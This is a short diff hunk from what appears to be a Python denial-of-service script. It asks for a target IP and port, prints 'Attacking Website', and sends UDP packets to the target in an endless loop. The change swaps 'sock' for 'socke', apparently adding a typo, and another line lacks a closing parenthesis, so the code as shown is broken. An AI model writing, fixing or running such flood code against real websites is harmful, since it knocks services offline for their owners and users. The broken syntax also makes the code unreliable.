@@ -6,4 +6,4 @@ ip = input('target ip: ')
 port = int(input('put a port: ')
 print('Attacking Website') 
 while True:
-     sock.sendto(byte, (ip,port))
+     socke.sendto(byte, (ip,port))
